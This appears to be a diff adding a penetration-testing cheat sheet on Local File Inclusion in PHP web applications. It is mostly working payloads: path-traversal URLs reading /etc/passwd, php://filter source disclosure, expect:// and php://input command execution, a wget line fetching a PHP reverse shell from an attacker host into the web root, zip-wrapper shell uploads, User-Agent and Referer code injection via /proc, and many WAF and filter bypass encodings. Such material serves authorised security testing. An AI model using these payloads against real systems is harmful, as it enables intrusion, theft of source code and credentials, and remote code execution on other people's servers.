@@ -1,0 +1,250 @@
+LFI IAST testing guide
+
+Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitising the input, allowing and attacker to manipulate the input and inject path traversal characters and include other files from the web server.
+
+Example:
+
+<?php
+   $file = $_GET['file'];
+   if(isset($file))
+   {
+       include("pages/$file");
+   }
+   else
+   {
+       include("index.php");
+   }
+?>
+
+There we see its including whatever is supplied for the "file" parameter and setting it without validation.
+
+* How to identify:
+Any script that includes a file from a web server is a good candidate for further LFI testing, for example:
+/script.php?page=index.html 
+In this example, we would be screwing with the page= parameter to something like:
+/script.php?page=../../../../../../../../etc/passwd
+
+
+* LFI Suite: You can use this automated tool to exploit LFI https://github.com/D35m0nd142/LFISuite
+
+* Nikto will usually show LFI's. Nikto -h <ip>
+
+* dotdotpwn is another LFI discovery tool  https://github.com/wireghoul/dotdotpwn
+
+* fimap is another LFI exploit tool  https://github.com/kurobeats/fimap
+
+* You can automate a fuzz of it using Burp Suite Intruder. Send a request that has a possible LFI paramater to Intruder and highlight the value portion of that parameter. Use the fuzz lists from SecLists: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI. You can also create a wordlist using this data: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list
+
+* Windows LFI wordlist: https://raw.githubusercontent.com/soffensive/windowsblindread/master/windows-files.txt
+
+* Other wordlists:
+https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list
+https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
+
+
+
+
+
+* /script.php?page=../../../../../../../../etc/passwd  
+
+Explanation: A simple directory traversal to get LFI
+
+
+* http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index  (index being the name of the page minus the .php. If the page was wingnut.php?m=, then the resource=wingnut is what you would put)
+* curl http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+PD9waHAgZWNobygkX0dFVFsneCddKTsgLy8gT01HIHlvdSBib3RoZXJlZCB0byBkZWNvZGUgYmFzZSA2ND8gPz4=
+* vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+* ?page=php://filter/resource=/etc/passwd (Another way to do the filter without base64 encoding it) 
+
+Explanation:
+Sometimes you may need to see the php source code to see if there is a blacklist or if theres an validation at all. Use PHP wrappers such as php://filter/convert.base64-encode/resource=index to try to read the actual file whatever.php's source code. This will convert it to base64 to prevent execution via the webserver. Decode it and you get the source code. php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read. The resource=index is a filter paramater. This parameter is required. It specifies the stream that you would like to filter. An example of using this is:
+
+http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index  (index being the name of the page minus the .php. If the page was wingnut.php?m=, then the resource=wingnut is what you would put)
+
+This forces PHP to base64 encode the file before it is used in the require statement. This result will probably display at the top of the page.  From this point its a matter of then decoding the base64 string to obtain the source code for the PHP files. An example of that would be:
+
+curl http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+PD9waHAgZWNobygkX0dFVFsneCddKTsgLy8gT01HIHlvdSBib3RoZXJlZCB0byBkZWNvZGUgYmFzZSA2ND8gPz4=
+
+You can also do echo "full base 64 string" | base64 -d
+
+Another example is:
+
+vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
+
+
+
+* php?page=expect://ls
+
+Explanation:
+Another PHP wrapper you can use is Expect. PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default, but its worth a shot. An example is:
+
+php?page=expect://ls
+
+If you get an error, its likley this wrapper is disabled
+
+
+* /fi/?page=php://input&cmd=ls   (This one is using another PHP wrapper Input)
+
+Another way is to intercept a POST and do http://192.168.183.128/fileincl/example1.php?page=php://input and in the POST data body you can put something like <? system('uname -a');?>
+If that works try downloading a reverse shell like: <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+If that works, go to the shell: http://192.168.183.129/shell.php
+
+
+
+
+* http://127.0.0.1/vuln.php?page=zip:///Library/WebServer/Documents/avatars/mypic.jpg%23shell
+* http://127.0.0.1/vuln.php?page=zip://avatars/myavi.jpg%23shell
+
+Explanation:
+PHP Zip Wrapper LFI (specifically on a file upload page)
+1. Create a PHP reverse shell
+2. Compress to a .zip file
+3. Upload the compressed shell payload to the server (you may need to do some file upload bypasses for this). If its an upload page for a picture or something, you would zip the reverse shell and then name it something like mypic.jpg and upload it.
+4. Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell (the %23 is URL encoding for #)
+5. The above will extract the zip file to shell, if the server does not append .php rename it to shell.php instead
+
+With full path it would look something like:
+
+http://127.0.0.1/vuln.php?page=zip:///Library/WebServer/Documents/avatars/mypic.jpg%23shell
+
+Without full path it would look something like:
+
+http://127.0.0.1/vuln.php?page=zip://avatars/myavi.jpg%23shell
+
+
+* test.php?page=/proc/self/environ (to test if the page is vulnerable to this. If its displayed on the page, the site is vulnerable)
+* GET lfi.php?file=../../../proc/self/environ HTTP/1.1
+  User-Agent: <?php phpinfo();?>  (this is an example if you intercepted it with BurpSuite)
+
+Explanation
+In Linux based system the environment-variables of the current process (self) can be accessed via /proc/self/environ. One of the environment-variables set (if apache2 is running) is the user-agent which can be controlled through a HTTP request. If the /proc/self/environ file can be accessed through LFI, then in this case “RCE” can be achieved by requesting the file in combination with the payload written into the HTTP User-Agent field.
+
+GET lfi.php?file=../../../proc/self/environ HTTP/1.1
+User-Agent: <?php phpinfo();?>
+
+Now if an attacker sends the above http request to the web server:
+1. First, the data on User-Agent field will be written in the /proc/self/environ file.
+2. Then the page request "lfi.php?file=../../../proc/self/environ" will include the content of /proc/self/environ file into the output page and our payload is get executed.
+
+
+* <? system('uname -a');?>   (A tiny PHP backdoor that can be used in the User-Agent field from the proc/self/environ hack)
+
+
+* vuln.php?page=/etc/passwd%00
+* vuln.php?page=/etc/passwd%2500
+
+Explanation:
+These are NUll Byte attacks. Null byte injection bypasses application filtering within web applications by adding URL encoded “Null bytes” such as %00. Typically, this bypasses basic web application blacklist filters by adding additional null characters that are then allowed or not processed by the backend web application. If you put %00 in a URL encoder https://meyerweb.com/eric/tools/dencoder/ You will see it gives you %2500. This is called Double URL Encoding meant to bypass some validation checks. 
+
+
+
+* /proc/self/fd/
+* Referer: <payload>
+
+Explanation: Similar to the previous /proc/self/environ method, it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer. When it comes to proc, these directories and files don't exist anywhere on disk. Rather, the kernel generates the contents of /proc as you read it. Each process has a directory in /proc, named by its numerical process identifier (PID). So for example, information about init (PID 1) is stored in /proc/1. There's also a symlink /proc/self, which each process sees as pointing to its own directory. So here we can do the same trick as the proc/self/environ one, where we intercept it in Burp and request /proc/self/fd/. This one they use the Referer header though to store the payload. This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc. I’d recommend brute forcing the directory structure of the /proc/self/fd/ directory with Burp Intruder + FuzzDB’s LFI-FD-Check.txt list of likely proc files, you can then monitor the returned page sizes and investigate.
+
+
+
+* Possible filter bypasses:
+
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+
+* 16 bits Unicode encoding:
+
+. = %u002e
+/ = %u2215
+\ = %u2216
+
+* UTF-8 Unicode encoding
+
+. = %c0%2e, %e0%40%ae, %c0ae
+/ = %c0%af, %e0%80%af, %c0%2f
+\ = %c0%5c, %c0%80%5c
+
+
+* Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
+
+..././
+...\.\
+
+
+* Bypass "../" with ";"
+
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+
+
+* Double URL encoding
+
+. = %252e
+/ = %252f
+\ = %255c
+http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
+http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+
+
+* NGINX/ALB Bypass
+NGINX in certain configurations and ALB can block traversal attacks in the route, For example: http://nginx-server/../../ will return a 400 bad request.
+
+To bypass this behaviour just add forward slashes in front of the url: http://nginx-server////////../../
+
+
+* Path Truncation bypasses
+
+In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
+Check if last 6 chars are passwd --> passwd/
+Check if last 4 chars are ".php" --> shellcode.php/.
+
+* More filter bypasses
+
+http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
